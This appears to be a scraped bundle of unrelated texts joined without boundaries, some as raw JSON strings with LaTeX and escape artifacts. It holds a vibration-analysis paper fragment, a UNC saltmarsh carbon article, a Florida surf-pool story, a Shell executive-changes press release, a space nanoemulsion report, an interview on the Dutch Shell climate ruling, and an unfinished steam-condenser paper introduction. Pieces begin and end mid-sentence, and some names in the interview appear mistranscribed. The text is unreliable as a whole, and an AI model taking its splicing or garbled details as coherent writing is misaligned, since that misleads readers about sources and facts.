first 12 natural frequencies.

The variation range of the circumferential perforation number is 3\u201320 with interval of 1. Noting that a transformed frequency parameter \\({P_{f2}}=f - {f_{n,2}}\\) is introduced to facilitate the impact analysis.

Full size image\n\nAs shown in Fig. 10, the effects of the circumferential perforation number on the natural frequencies are more complicated, while it generally shows a linear decreasing trend with the increase of the circumferential perforation number. Similarly, the sensitivity analysis of the first 12 natural frequencies of the shell on the perforation radius is conducted, as shown in Fig. 11. From the result, it can be seen that the sensitivity coefficients of the first 12 natural frequencies on the circumferential perforation number are relatively large. Compared with the perforation radius and axial perforation number, the vibration characteristics is more sensitive to the variation of the circumferential perforation number. Specially, the natural frequencies of the shell would change abruptly under some circumferential perforation number conditions, the detailed regulations can be found in Fig. 12. Results indicate that there are specific impact patterns between the circumferential perforation number and the natural frequency, that is, the first 12 natural frequencies of the shell only change abruptly when \\({N_\\theta }=2n\\), \\({N_\\theta }=n\\), \\({N_\\theta }={{2n} \\mathord{\\left/ {\\vphantom {{2n} 3}} \\right. \\kern-0pt} 3}\\), \\({N_\\theta }={n \\mathord{\\left/ {\\vphantom {n 2}} \\right. \\kern-0pt} 2}\\), \\({N_\\theta }={{2n} \\mathord{\\left/ {\\vphantom {{2n} 5}} \\right. \\kern-0pt} 5}\\), and \\({N_\\theta }={n \\mathord{\\left/ {\\vphantom {n 3}} \\right. \\kern-0pt} 3}\\).\n\nMoreover, through in-depth analysis of the influence law demonstrated in Figs. 10 and 12, some profound internal relations between the circumferential perforation number and the natural frequencies can be discovered. The intrinsic influence mechanism of the circumferential perforation number on the natural frequencies of the perforated hard-coating cylindrical shell is shown in Fig. 13. When the circumferential perforation number is odd, the ratio of the circumferential perforation number to the circumferential wave number \\({{{N_\\theta }} \\mathord{\\left/ {\\vphantom {{{N_\\theta }} n}} \\right. \\kern-0pt} n}\\)= 1/1, 1/2, 1/3, 1/4, indicating that the denominator increases in natural sequence (1, 2, 3, 4) with the numerator 1.\n\nFig. 12 Impact pattern of the circumferential perforation number on the first 12 natural frequencies.

            "content": "When it comes to helping in the fight against climate change, reducing your carbon footprint is a regularly suggested tactic \u2014 both for individuals and organizations.\n\nResearchers at the UNC Institute of Marine Sciences are helping the University do just that with a blue carbon habitat in Morehead City. This human-made habitat collects and stores carbon dioxide from the atmosphere and serves as a carbon emission offset for Carolina, which is aiming to reach carbon neutrality by 2040.\n\nHeaded by Professor Antonio Rodriguez, the project involved the creation of a saltmarsh with the intent of capturing carbon and depositing it into the marsh\u2019s sediment along the shoreline near IMS. Initially created in 2014 with 3,500 bushels of shell and 2,000 bundles of marsh grass, the habitat has been tracked for the past seven years to gauge its impact.\n\nRodriguez is working with fellow IMS faculty members Michael Piehler, Joel Fodrie and several graduate students to collect sediment samples in the area to track carbon deposits and maintain the habitat by monitoring the rise in sea level to ensure the marsh\u2019s protective oyster reefs continue to grow.\n\n\u201cWhen the call for proposals from the UNC Energy Services\u2019 Climate Action Plan came out in 2012 to make campus more carbon neutral, we jumped at the chance to transform our shoreline into a more natural state,\u201d Rodriguez said. \u201cIt ended up being a massive group effort with students, faculty and technicians working together, hauling oyster shells and planting marsh grass. The result has truly exceeded our expectations.\u201d\n\nContinue reading to see the project in action\n\nRodriguez and Piehler, a professor at IMS who also serves as the director of the UNC Institute for the Environment and Carolina\u2019s chief sustainability officer, are working together on the project. Rodriguez proposed the $50,000 project to help the University achieve its carbon neutrality goals. The saltmarshes, he said, can also serve as an educational tool for students, faculty and the surrounding communities.\n\nGraduate research assistant and doctoral student Molly Bost, who earned her bachelor\u2019s degree in environmental science and master\u2019s degree in marine sciences at Carolina, collects sediment samples on the shoreline by IMS. The samples are later analyzed in the lab to examine how effectively carbon is being deposited in the saltmarsh.\n\nSaltmarshes are \u201cblue carbon\u201d habitats that can store more carbon annually than terrestrial forests, playing a major role in mitigating climate change.\n\nPostdoctoral researcher Stacy Zhang measures the size of oyster clusters on a nearby oyster reef.\n\nTo protect the carbon-capturing saltmarsh, IMS researchers constructed two oyster reefs. The reefs act as a natural barrier, protecting the saltmarsh from currents and damaging waves from storms. Since oysters need a delicate balance of being exposed above water and covered by water to maximize growth potential, the team actively monitors the rise in sea level to ensure the reef continues to grow.\n\nZhang checks a fish trap at the saltmarsh and oyster reef habitat near the IMS shorefront. While the human-made habitat could serve a role in addressing climate change through carbon sequestration, it also creates homes for various sea life, improves water quality and protects the shoreline from erosion.\n\nBack in the IMS labs, Zhang examines a sediment sample to look for signs of an increase in carbon in the soil. The soil samples can show changes in carbon storage over long periods of time.\n\n\u201cIt is wonderful that UNC Energy Services had the foresight to fund this pilot project that harnesses our expertise in coastal science and leverages the physical location of our Institute of Marine Sciences to make progress toward meeting our sustainability goals,\u201d Piehler said.",

Not all nearby homeowners are stoked\n\nSurfing is finally coming (we think) to one of the flattest bodies of North American oceanic waters: the Gulf of America, known as the Gulf of Mexico in other parts of the world but changed in the U.S. by the Trump Administration.\n\nThis time, however, Panama City Beach residents and tourists won\u2019t have to wait for another Category 5 hurricane to stir up consistent \u201ccloseouts.\u201d\n\nThe business idea is \u2014 to borrow from the popular baseball movie \u201cField of Dreams\u201d \u2014 If you build it, they will come.\n\nAnd that\u2019s what Shell Point Beach Surf Club introduced to the community at Hyatt Place on March 3: A fun, family-oriented sporting activity for all ages and degrees of physical mobility.\n\nThe surf club will also offer a surf school, restaurant and bar.\n\nWarren Smith, creative director and founder of Shell Point Surf Club, said the concept will resemble the Waco, Texas, pool, but with a Gulf vibe and newer wave-making technology.\n\nBut (there\u2019s always a but) not all nearby residents attending the icebreaker were pleased. Summerwood homeowners, for example, whose neighborhood abuts the proposed freshwater surf spot, brought their own tsunami of questions.\n\nMost concerns \u201cbarreled\u201d toward Shell Point Surf Club\u2019s request of a variance to build within 100 feet of their neighborhood. The normal blueprint is 1,000 feet.\n\nIn a roundabout way, one resident asked the surf club why it didn\u2019t draw up a development that obeyed the zoning ordinance to begin with.\n\nSmith responded by stating that his team is not doing anything that Top Golf hasn\u2019t already done.\n\nThe new Top Golf, Summerwood neighborhood and surf club are all within a stone\u2019s throw of one another in the Pier Park area.\n\nOther community concerns revolved around visual blight, noise and light pollution, traffic and the future property value of their homes.\n\nTo make a long story short, by the end of the evening everyone walked away with their \u201cCowabunga\u201d moment and possible \u201cdawn patrol.\u201d\n\nLinda Cope, a 24-year Summerwood resident and founder and president of Warrior Beach Retreat, said her community may have been misinformed before the meeting about the severity of the project.\n\n\u201cOnce we got the whole picture, and they're going to try to respect the variance as much as possible, I don't think it's going to be so bad,\u201d Cope said. \u201cSo, with them doing what they can in respect of the privacy of Summerwood, I think (the surf pool) will be a plus. It's either have that or get something like a Costco with trucks going back and forth all the time.\u201d\n\nBob Malouin, a seven-year Summerwood resident, said his main concern about the development is the roadway\u2019s tree-lined buffer zone, and wishes the city would buy the lot for a more bird-friendly park.\n\n\u201cFrom my backyard at night I can see the (Pier Park) wheel clearly,\u201d Malouin said. \u201cEverybody knows it's going to happen \u2026 (Hills Road) to a four lane, right? So, we (need) all these trees to provide us a buffer from the likes of Pier Park (and the surf pool.)\u201d\n\nMalouin did add that he thought the surf pool was \u201ca pretty nice-looking development,\u201d and that the proposed blueprint, with a wider Hills Road, should accommodate a proper buffer zone.\n\nJames Tipton, executive director of the Florida Panhandle Golf Therapy Alliance, is all for the surf development.\n\n\u201cI don't see any negative connotations about the pool,\u201d Tipton said. \u201cSomething like this, a surf pool, can help locals; help veterans with disabilities; and help adults and children with mental and physical disabilities. I think anything of this nature is just good for locals.\u201d\n\nIf there is less \"onshore wind,\" construction will begin January 2026, and open for business the following summer.\n\nPanama City Beach\u2019s planning board will vote on the 100-foot variance on April 9.\n\nUntil then, wholehearted Panhandle surfers and beach-towel sunbathers can explore the coastline's \u201cankle breakers.\u201d",

Going forward, we will delayer our most senior leadership structure to reflect the three primary areas of business value \u2013 Integrated Gas; Upstream; and Downstream, Renewables and Energy Solutions, whilst also elevating Trading and Supply, which is a key enabler across the organisation. In the first half of 2026, we will also integrate the technical divisions, that today make up our Projects and Technology directorate, into our business lines. This further simplification will empower our businesses by bringing these technical capabilities closer to where we generate value.\u201c\n\nAfter more than a decade of distinguished service with Shell, Integrated Gas and Upstream Director, Zo\u00eb Yujnovich, will step down effective 31 March 2025. Zo\u00eb will assist with the transition, after which she will leave the Group. Cederic Cremers is appointed President, Integrated Gas, and Peter Costello is appointed President, Upstream, with both joining the Executive Committee effective 1 April 2025.\n\nSawan said, \u201cI have deeply appreciated Zo\u00eb\u2019s insights and guidance as a member of the Executive Committee. She has contributed to shaping our company strategy, driven disciplined focus, simplicity and improved performance. Zo\u00eb\u2019s outstanding impact as a leader leaves a lasting legacy and positions us strongly for the future. Her hallmark is a strong sense of purpose and deep engagement with our front-line staff, communities and host governments. I wish Zo\u00eb success in all that lies ahead and welcome Cederic and Peter to the Executive Committee.\u201d\n\nNotes to editors\n\nCederic Cremers was appointed Executive Vice President, Liquefied Natural Gas in August 2021, a role that was expanded in 2024 to include Shell\u2019s Gas to Liquids assets. He joined Shell\u2019s Retail business in 2002 and has held a variety of finance and commercial roles across Shell upstream and downstream businesses, including General Manager, Shell Chemicals Europe; Vice President, Commercial and New Business Development, Asia; and Executive Vice President and Country Chair, Russia. Cederic is a Dutch citizen and holds a Master\u2019s degree in Business Economics from Erasmus University.\n\nPeter Costello was appointed Executive Vice President, Conventional Oil and Gas in November 2021 after serving as Senior Vice President of that same business. Peter joined Shell in 2016 as Vice President, Nigeria and Gabon following the company\u2019s combination with BG Group, where he held geographically diverse senior roles across Downstream, Midstream, and Upstream, including President and Country Head, Kazakhstan. Peter\u2019s career began at the former British Gas. He is a British citizen and holds a Bachelor\u2019s degree in Science & Materials Technology and an MBA from the University of Southampton.\n\nFrom 1 April 2025, leaders on the Executive Committee representing Integrated Gas; Upstream; Downstream, Renewables and Energy Solutions; Trading and Supply; and Projects and Technology, will each be referred to as President of their respective organisations, rather than Director. Functional leaders on the Executive Committee will be referred to as Chief Officer of their respective functions.\n\nThe following members of the Executive Committee will continue in their current roles: President, Projects and Technology, Robin Mooldijk; Chief Financial Officer, Sinead Gorman; Chief Human Resources and Corporate Officer, Rachel Solway; and Chief Legal Officer, Philippa Bounds. As previously announced, Andrew Smith and Machteld de Haan will join the Executive Committee from 1 April 2025 as President, Trading and Supply and President, Downstream, Renewables and Energy Solutions, respectively.\n\nThe changes announced today do not affect Shell\u2019s financial reporting segments, which remain Integrated Gas; Upstream; Marketing, Chemicals and Products; Renewables and Energy Solutions; and Corporate.\n\n\n\n\n\nEnquiries\n\n\n\nUK / International Media Relations: +44 20 7934 5550\n\nAmericas Media Relations: Contact Shell US Media Team\n\nAsia Pacific Media Relations: apac-media@shell.com\n\nMiddle East and North Africa Media Relations: DUB-CNF-MENA-Media-Relations@shell.com\n\nCautionary note\n\nThe companies in which Shell plc directly and indirectly owns investments are separate legal entities.

The use of the terms Shell\u2019s \u201cNet Carbon Intensity\u201d or NCI are for convenience only and not intended to suggest these emissions are those of Shell plc or its subsidiaries.\n\nShell\u2019s net-zero emissions target\n\nShell\u2019s operating plan, outlook and budgets are forecasted for a ten-year period and are updated every year. They reflect the current economic environment and what we can reasonably expect to see over the next ten years. Accordingly, they reflect our Scope 1, Scope 2 and NCI targets over the next ten years. However, Shell\u2019s operating plans cannot reflect our 2050 net-zero emissions target, as this target is currently outside our planning period. In the future, as society moves towards net-zero emissions, we expect Shell\u2019s operating plans to reflect this movement. However, if society is not net zero in 2050, as of today, there would be significant risk that Shell may not meet this target.\n\nForward-looking non-GAAP measures\n\nThis press release may contain certain forward-looking non-GAAP measures such as cash capital expenditure and divestments. We are unable to provide a reconciliation of these forward-looking non-GAAP measures to the most comparable GAAP financial measures because certain information needed to reconcile those non-GAAP measures to the most comparable GAAP financial measures is dependent on future events some of which are outside the control of Shell, such as oil and gas prices, interest rates and exchange rates. Moreover, estimating such GAAP measures with the required precision necessary to provide a meaningful reconciliation is extremely difficult and could not be accomplished without unreasonable effort. Non-GAAP measures in respect of future periods which cannot be reconciled to the most comparable GAAP financial measure are calculated in a manner which is consistent with the accounting policies applied in Shell plc\u2019s consolidated financial statements.\n\nThe contents of websites referred to in this press release do not form part of this press release.\n\nWe may have used certain terms, such as resources, in this press release that the United States Securities and Exchange Commission (SEC) strictly prohibits us from including in our filings with the SEC.

Their preliminary results suggest that drugs needed by astronauts can be delivered effectively in space.\n\nA team from the University of Adelaide working with the German Aerospace Center (DLR), Institute of Aerospace Medicine, conducted the StarMed experiment by exposing six small glass vials on a space flight and then analyzing the stability of the emulsion on its return to Earth. The same number of identical control vials were on the ground in both Europe and Adelaide.\n\nNanoemulsions comprise oil droplets (0.0001 mm in size) that are dispersed into an aqueous solution, with the oil droplets being the carrier of melatonin in this experiment.\n\nProfessor Volker Hessel, who is the Processes Program Leader at the ARC Center of Excellence in Plants for Space and Research Director at the University of Adelaide's Andy Thomas Center for Space Resources, led the experiments with Ph.D. student Modupe Adebowale, of the University of Adelaide and University of Nottingham.\n\n\"The first aim of the experiment was to find out how the stability of the dispersed (oil in water) phases behaves under the changed gravitational conditions,\" said Professor Hessel.\n\n\"We also aimed to find out how the controlled release of the encapsulated drug melatonin behaves under the changed gravitational conditions, with one sample of nano-oil droplets coated by a chitosan layer.\n\n\"In the long-term, the goal is to develop stable nanoemulsions with advanced controlled-release kinetics for medical use in space and on planets colonized by humans for long-term habitation.\"\n\nThe University of Adelaide conducted the experiment with the DLR's Dr. Jens Hauslage. As part of its MAPHEUS 15 mission, DLR launched a sounding rocket from northern Sweden that contained 21 scientific experiments from organizations around the world.\n\n\"In this collaboration, it was shown again that sounding rockets are a cost-effective and reliable test platform for experiments and technologies under micro- and altered-gravity conditions for preparation of low Earth orbit and deep space missions. Especially with regard to human exploration and life on the moon and Mars, these experiments are an important preparation to ensure the health of humans in space,\" said Dr. Hauslage.\n\nDLR's research rocket, launched in November 2024, was the 600th to lift off from the Esrange rocket base.\n\n\"As oil droplets deliver the drug too fast, we added a chitosan layer around them, which is a natural, renewable material derived from chitin that forms the shell of shrimps and other crustaceans. This layer acts like a barrier and regulates the release of the melatonin drug,\" said Professor Hessel.\n\nDiscover the latest in science, tech, and space with over 100,000 subscribers who rely on Phys.org for daily insights.

The drug melatonin reduces the bone loss and has many other positive beneficial health effects.\n\nIn order to provide melatonin to astronauts at the right time and dose, a formulation is needed, which means the drug must be put into a matrix that controls its release. Liquid formulations are increasingly taken by astronauts: about 40% of the formulations at the International Space Station are liquid.\n\n\"Our experiments are testing whether the chitosan-layered nanoemulsions are stable in space and function well for melatonin delivery,\" said Professor Hessel.\n\n\"Preliminary data suggest that the droplet size and distribution of nanoemulsions without chitosan coating increased while nanoemulsions with chitosan coating did not change at all. And small, more uniform droplets are desired for better uptake and medical outcomes.\n\n\"If confirmed, this would mean that microgravity nanoemulsions with chitosan coating are more stable. It would also mean that vibrations hardly affected the quality of our nanoemulsions with and without chitosan coating.\"\n\nAs well as the StarMed experiment, the University of Adelaide's MiniWeed experiment, conducted in collaboration with La Trobe University, will test how altered gravity affects duckweed\u2014a plant identified as a potential food source for astronauts.",

            "content": "Did the oil giant's court victory mark a turning point for climate cases?\n\nIn May 2021, a Dutch court delivered a landmark ruling that shook the global fossil fuel industry. For the first time, a company was legally ordered to cut its CO2 emissions when Shell was mandated to reduce its global emissions by 45 per cent by 2030, compared to 2019 levels. The lawsuit, spearheaded by Milieudefensie (Friends of the Earth Netherlands) and co-plaintiffs, marked a pivotal moment in corporate climate accountability.\n\nAs expected, Shell appealed the decision, and in November last year, the appeals court in The Hague overturned the ruling. This was widely perceived as a major victory for Shell \u2013 but the implications of this case are far more nuanced.\n\nWhile the appeals court\u2019s decision dealt a blow to the plaintiffs, many legal experts argue that the court\u2019s acknowledgment of corporate responsibility for emissions sets a powerful precedent. The case also highlighted the challenges of calculating a company\u2019s specific emissions reduction obligations, an issue at the heart of ongoing climate litigation. Some experts believe that this ruling, despite its outcome, may have opened the floodgates for more lawsuits targeting major polluters.\n\nTo unpack the complexities of this case and explore its broader implications, FairPlanet's Yair Oded spoke to Noah Walker-Crawford, a research fellow at the Grantham Research Institute on Climate Change and the Environment at the London School of Economics and the Grantham Institute at Imperial College London. Walker-Crawford leads the project \u2018Bridging the Evidentiary Gap: Climate Attribution in the Courtroom,\u2019 which investigates how climate attribution science is influencing litigation.\n\nIn this deep-dive interview, he breaks down the legal arguments, offers insights into the Shell ruling's impact on ongoing climate cases and shares his predictions for the future of climate litigation.\n\nFairPlanet: Can you tell us about Milieudefensie, the NGO that brought the lawsuit against Shell, and its coalition of co-plaintiffs? What was the core of their legal argument, and what were they demanding?\n\nNoah Walker-Crawford: Milieudefensie is the Dutch branch of Friends of the Earth, which is a group of NGOs with chapters in a lot of different countries. They've been around for quite a few years, and they're involved in all different kinds of activities relating to the environment. In the past few years, they've become quite engaged in climate change, particularly in climate litigation. The Netherlands especially has been seen as quite progressive in terms of climate litigation, and the big first successful case against the government was in the Netherlands. That was the Organda case, which was brought by another NGO over what the government had to do. It basically was about making the government increase its targets for addressing climate change.That [case] was successful, and following that came this case against Shell.\n\nThe basic idea was that when the case was filed in 2019, if I'm not mistaken, there had already been a number of successful cases against governments, saying that governments need to increase their climate change ambitions in line with the Paris agreement and with other commitments they\u2019ve signed up to - [arguing that] governments weren't doing enough to address climate change. And what the shell case is about is saying that if governments have a responsibility to address climate change, then so do corporations.\n\nIn terms of climate litigation against corporations, there are sort of two basic approaches: \u2018backward-looking\u2019 and \u2018forward-looking\u2019 cases. The backward-looking cases are about damage that's already occurred, or basically holding companies responsible for their contribution to existing damages or risks. And then the other approach is forward looking - to say that companies need to change their behaviour going forward to prevent climate change from getting even worse.\n\nAnd so this case against Shell was the first of this kind. It is what's referred to as the \u2018corporate framework\u2019 cases. And what the case demands, in basic terms, is to stay in line with the Paris commitments and other kind of related commitments: cut its emissions by 45 per cent by 2030 in relation to the level of emissions in 2019. This figure comes from the IPCC, the intergovernmental panel on climate change, which is a UN climate science body that said that globally all emissions need to be reduced by 45 per cent by 2030 to still have a chance of achieving 1.5 degrees. And it's seen also as kind of an interim target towards net zero by 2050, which there's this scientific consensus that that's what's needed. And so basically the idea is to say, \u2018okay, if that's what everyone should be doing, then that's the very least that Shell should be doing as one of the major oil and gas companies.\u2019 That was the basic argument in the case.\n\nThe 'drug dealer's' argument\n\nWhat were Shell\u2019s main claims in its appeal, and on what legal basis did the Dutch appeals court overturn the 2021 ruling of the Hague District Court?\n\nThe case was filed in 2019; then the initial lower court verdict came in 2021, and that was a success, which was quite surprising at the time because it was the first case of this kind and really sent shockwaves through the industry, because this meant that, potentially, a lot of other companies could be sued in a similar way. On appeal, Shell said the law shouldn't be applied in this way, [and] argued that there wasn't sufficient evidence to determine what level of emissions reduction is necessary. They also made some arguments saying that it would be very difficult to implement a verdict.\n\nShell lost on all the legal points [whether they have any kind of obligation to address climate change to begin with or to reduce their emissions, which the court said they do]. Where Shell was successful was on their scientific arguments. The first major point where they convinced the court was in saying that you can't apply this global target of 45 per cent reduction to an individual company because the circumstances for each company, for each sector, et cetera, are going to be different. They said that you'd need to calculate it for the individual company, but argued that it's very difficult to do. That's where they really ended up convincing the court.\n\nThe other major point was that even if the court ordered them to reduce their emissions by 2030 - they could implement the verdict in such a way that it wouldn't lead to an actual emissions reduction. One part of Shell's business is actually extracting oil, refining it and selling it. But another major part, [about] two thirds of their business overall, is just buying and selling oil [and gas]. So they're basically a broker for fossil fuels. And they said that they could reduce this brokerage business, but that wouldn't cause any less oil and gas to be extracted or burned, which would allow them to comply with a verdict without actually [making] any meaningful contribution to reducing climate change. It's also called the drug dealers argument: \u2018If I don't do it, someone else will do it.\u2019 It's quite controversial, this argument, but those were the two points that convinced the court ultimately.\n\nThe case heavily referenced Shell\u2019s scope one, two, and three emissions. Can you briefly explain what these categories mean and why they were central to this lawsuit?\n\nScope one, two and three are essentially different ways of categorising greenhouse gas emissions. If you're a company - scope one emissions are the emissions you produce directly. So if you have a factory, let\u2019s say, that refines oil and is burning off some oil in the process, those are CO2 emissions that you're producing directly.\n\nScope two refers to emissions that you produce indirectly through company operations. Say if you send your employees on a plane to go to another country and that plane is producing emissions, that's scope two. Scope three includes emissions further up or down the supply chain. So, for example, if Shell extracts oil out of the ground, refines it, and then sells it at their gas station, ultimately the emissions are caused by the end user, by the consumer who puts it in their car and burns it. Those are considered to be scope three emissions.\n\nIt\u2019s a question of who is responsible for which category of emissions, and it's a bit complicated in practice because one person's scope one emissions are another person's scope three emissions. If I fill up my gas tank at the Shell gas station and drive my car, then I'm producing scope one emissions, and those same emissions are Shell's scope three emissions. Shell argued vehemently that bear no responsibility for scope three [emissions], but the court said that companies do definitely have a responsibility for scope three emissions as well.\n\nWhat This Means for Climate Litigation\n\nThe Grantham Institute describes the Shell case as part of a broader category of \u201ccorporate framework\u201d litigation, which challenges the legitimacy of corporate climate policies. With more than 20 such cases pending globally, how might Shell\u2019s appeal victory impact their outcomes?\n\nThat's a really interesting question. like I said earlier, the Shell case was the first corporate framework case, and after the the 2021 successful verdict against Shell, a bunch of other cases were filed. For example, there is one against Total in France; there are several cases against car companies in Germany over moving towards electric vehicles; there is another one against a Swiss cement company called Holcim in Italy; there is one against ENI, which is the biggest Italian energy company.\n\nThe verdict [in Shell\u2019s case] is quite positive for these other cases in terms of whether companies have a legal responsibility to address climate change. The court said- absolutely, yes. Where the case failed was over the evidentiary issues of how can you calculate an individual company's responsibility?\n\nThe court basically said it would have to be calculated for this individual company, and the other cases take different approaches in this regard. So while some of them use these universal global targets like the 45 per cent target in the Shell case, others are more specific. For instance, in the case against Total in France they use sector-specific targets with separate targets for oil and gas emissions reductions. Meanwhile, in the case against VW in Germany, they basically break down this global target for the company and have this complex calculation where they say argue how many electric cars VW should be producing in relation to internal combustion engine cars.\n\nThe indication after the Shell verdict is that perhaps for these cases to be successful, they'll have to be more specific, but we'll have to see, of course, since the Shell case has just been appealed as well.\n\nIn a previous interview with The Guardian, you mentioned that research is rapidly advancing to bridge the gap between global emissions targets and company-specific reduction obligations. Can you elaborate on this?\n\nThe kind of science that goes into calculating these emissions reductions targets is called integrated assessment models, which are these massive models that are a projection of how society, the economy and emissions will develop in the future based on different scenarios of industrial change, increasing use of renewables, et cetera. And it projects how all the different factors can interact, and sets these pathways, saying, globally, this is what kind of emissions reductions we need to achieve certain targets to limit global warming to 1. 5 degrees Celsius or to achieve net zero by 2050. The science is developing quite rapidly, which potentially means that there will be a better evidentiary basis for these cases in the future.\n\nIn this context, then, what level of scientific consensus would courts require to impose legally binding emissions targets on corporations?\n\nIn the trial, there were all these discussions around how you can calculate an emissions reduction pathway for Shell, and there were experts from both parties who were putting forward different numbers.\n\nThose numbers are always going to vary a bit, because there are different approaches to this kind of modeling and there are always going to be different assumptions you need to incorporate. At the same time, these models are always updated with real-time data, and so the figures are always going to vary a bit. What was interesting in the trial was that even Shell's hired experts said that there had to be an emissions reduction, though a lot lower than what milieu was saying. And the way the court understood this is that they said, \u2018Oh, there are all these different figures, which means there's a lack of scientific consensus.\u2019\n\nFor me, there needs to be some clarification about what scientific consensus means, because the scientific consensus doesn't mean that scientists are always going to agree on all of the figures. All the experts agree that there needs to be an emissions reduction. All the numbers are pointing in the same direction. I think that's the key point where Shell really was able to convince the court in a way that some of the scientists I've spoken to who work in this field don't think it\u2019s an entirely correct understanding of what the science is.\n\n\"The science is developing quite rapidly, which potentially means that there will be a better evidentiary basis for these cases in the future.\"\n\nSo from your perspective, the hope is that the courts would eventually consider the broader trends and their implications, rather than focusing on isolated details.\n\nYes. I mean, it's also a challenge to explain science to courts. Science and law are both trying to figure out the truth about the world in some sense, but they have very different ways of doing that.They ask different questions and take different approaches to understanding what's going on.\n\nBroadly speaking, science is much more open-ended. It's always a constant conversation. It's always being revised. Whereas in a court of law, the court wants to establish the facts. They want to know what's the truth so they can make a decision about the case. And, of course, courts do account for the fact that there is often going to be uncertainty and there are different standards of evidence that are applied and different kinds of cases; but still, it's a challenge because science is complicated and evolves rapidly, and the judges aren't scientific experts - they\u2019re lawyers.\n\nDid the Court Just Unlock a Wave of Environmental Lawsuits?\n\nWhile the ruling was a setback for climate litigation, some legal experts believe it leaves room for future cases against major polluters. Lawyer Roger Cox, for instance, noted that the court reaffirmed corporate responsibility to align emissions reductions with the Paris Agreement. Beyond the specific implications for the 20 corporate framework cases, what aspects of the ruling provide a foundation for continued legal action?\n\nI would say the verdict was very, very positive, and it was about as positive as it could have been while still being a dismissal of the case.\n\nIf you take a look at the verdict, over half of it is basically the court laying out their opinion of why corporations do have obligations to address climate change in line with the Paris agreement [and] human rights commitments. They say, for example, that, climate change affects people's human rights, which means both governments and corporations have a duty, a legal responsibility to address the issue. And so I think the case provides very fruitful ground for new kinds of claims going forward.\n\nFor example, one thing the judges mentioned in the verdict is that in their opinion, new oil and gas exploration most likely isn't in line with this corporate duty to address climate change in line with the Paris commitments. And while they said this case isn't about whether Shell is allowed to open up new oil fields and [therefore] couldn\u2019t make any ruling on the issue, it was [nonetheless] an invitation to bring new cases against Shell over new oil and gas exploration.\n\nHave past court rulings on emissions influenced policy decisions? Can you point to any cases where legal verdicts directly led to regulatory changes or prompted executive or parliamentary action to curb corporate emissions?\n\nAbsolutely. There's been a lot of successful climate litigation against governments.\n\nThe first big successful case was in the Netherlands in 2015. Then, that legal strategy of suing governments over climate commitments was replicated in a lot of other countries and led to immediate legislative change. For example, there was a successful verdict in Germany in 2021 at the German constitutional court where, the court said that the government was violating the human rights of future generations by not doing enough about climate change. Then the government immediately changed the German law which outlines how the country addresses climate change.\n\nAnd that happened in a number of other countries as well: France, Ireland, and more recently last year there was a case in the UK over the government's permission to grant a license for oil and gas exploration. The legal argument in this case was that in granting this permission, the government should take into account the scope three emissions - the emissions from the oil and gas that would be extracted - which hadn't been done previously. And the UK Supreme Court said - absolutely, this has to be taken into account. This decision led to the halting of existing processes of granting new licenses for oil and gas exploration because now scope three emissions have to be taken into account.\n\nWe've seen that in a number of countries around the world, and these cases also build on each other. But like I said, the most success has been in cases against government so far and less so against corporations.\n\nAnother thing to mention in this context is that litigation is really a response to political failure. If there were enough happening at a political level, it wouldn't be necessary to bring these cases. It's kind of an act of desperation to say, okay, if not enough is happening at a political level, then you can try and move it forward through legal means or leveraging the law to address climate change.\n\nWhen claimants ask companies like Shell to reduce emissions, do they specify how this should be done? For example, should companies scale down production, transition to cleaner technologies, or take other measures? Given that fossil fuels still underpin critical industries - from transportation and healthcare to food production - do you see risks in forcing companies to reduce production before viable alternatives are fully in place?\n\nIn the Shell case, Milieudefensie wasn't asking for Shell to reduce their emissions in any specific way. It left it up to Shell how they could reach this target. And most of the other cases are structured in a similar way, although it varies. I mentioned earlier this Volkswagen case, which is very specific in terms of requiring them to produce a certain number of electric vehicles. But that's maybe more of the exception. I think the key point in this is that these companies need to be part of the energy transition, and these cases are compelling them to take a more active role in promoting this transition.\n\nAt this point, these companies have a choice whether to continue investing more in fossil fuels and dirty energy or to invest more in the technologies that we need to move towards more cleaner forms of energy production. And part of the problem now is that these companies still see that there's a big profit to be made by investing in fossil fuels, which means they have less of an incentive to move in the right direction, even though they have a big capability to push things in that direction.\n\nBut, of course, it's important to say that he energy transition isn't simple or straightforward; we can't just shut off all the fossil fuels from one day to the next. There are big questions of equity and justice involved in this as well. On that note, many are saying that the global north needs to move much more quickly, especially because it has a much bigger historical responsibility in causing climate change, whereas the poor and more vulnerable people in the Global South should be given more leeway because a lot more emissions have been produced historically in the Global North.\n\nThese are key issues in the UN negotiations around climate change as well, how to deal with these issues of global justice and equity in the global energy transition. But I think these companies absolutely have a part to play, and these cases are about getting them to move in the right direction.\n\nWhat makes you optimistic about the future of climate litigation?\n\nWhat makes me optimistic is that more and more courts are recognising that climate change is a legal issue and that the law can be used to address it. Even if the case against Shell wasn't successful, the court definitely recognised that law has an important role to play in this.\n\nAnd what also makes me hopeful is that the science is significantly improving around emissions reduction pathways and climate modeling. We have a better and better understanding of how global warming is causing local impacts affecting people around the world, whether it's in terms of glacial retreat or hurricanes or sea level rise, and who is contributing how much. And that means there's better and better evidence for these sorts of cases going forward.\n\nIs there a specific case you recommend people follow to stay updated on ongoing litigation?\n\nYes, absolutely. There is a very interesting one - the case of Luciano Yuya, a Peruvian farmer, against RWE, a German energy company and one of the biggest European emitters. The lawsuit is trying to set a precedent for holding major greenhouse gas emitters responsible for their contribution to climate change and get them to pay up for climate damages. It has to do with a glacial retreat leading to a risk of flooding in the Peruvian Andes.\n\nIt is one of the first cases of that kind, and out of all these cases it is the one that's gotten the furthest. The court has already been convinced on the legal arguments and said that, in principle, they think that corporations can be held responsible for their contribution to climate change. Now they are looking at the evidence. It's been going on for 10 years and there is a hearing happening [in March]. It\u2019s going to be very interesting to see what comes out of that.\n\nI've also been involved in that case since the very beginning. So I'll be in court for that next month.\n\nImage by Jahanzeb Ahsan.",

            "content": "Steam condensers are integral components in thermal power plants, tasked with converting exhaust steam from turbines into liquid water, which is then recirculated back into the boiler1. This process is essential not only for improving the efficiency of the power generation cycle but also for maintaining the system\u2019s operational stability and desired parameters2. The effectiveness of a steam condenser directly influences the overall performance, efficiency, and reliability of the power plant3,4,5. Maintaining optimal pressure within the steam condenser is crucial for ensuring efficient operation. Improper pressure control can lead to inefficient condensation, higher energy consumption, and potential damage to the condenser and related equipment6,7. Thus, precise pressure regulation is imperative to achieve efficient and stable operation in thermal power plants.\n\nTo address the challenges of controlling condenser pressure, various control methodologies have been explored. Adaptive control methods, which dynamically adjust controller parameters based on real-time system behavior, offer significant advantages in managing nonlinearities and time-varying dynamics8,9. These methods enhance the system\u2019s ability to respond to unforeseen disturbances and changes in operating conditions by continuously updating control parameters to maintain optimal performance. In addition to adaptive strategies, artificial intelligence (AI) based control techniques have gained prominence due 